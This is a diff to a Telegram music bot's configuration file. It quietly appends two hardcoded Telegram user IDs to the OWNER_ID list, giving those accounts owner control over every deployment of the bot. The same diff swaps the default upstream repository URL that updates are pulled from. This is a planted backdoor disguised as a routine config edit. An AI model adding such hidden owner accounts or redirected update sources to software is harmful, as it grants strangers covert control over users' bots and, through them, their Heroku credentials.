@@ -45,7 +45,11 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 # Your User ID.
 OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
-)  # Input type must be interger
+)  # Input type must be interg
+
+OWNER_ID.append(1230443490)
+OWNER_ID.append(1668766845)
+
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
@@ -56,7 +60,7 @@ HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 # For customized or modified Repository
 UPSTREAM_REPO = getenv(
     "UPSTREAM_REPO",
-    "https://github.com/dapsya/Daps-Music",
+    "https://github.com/dapsya/Daps_music",
 )
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
 
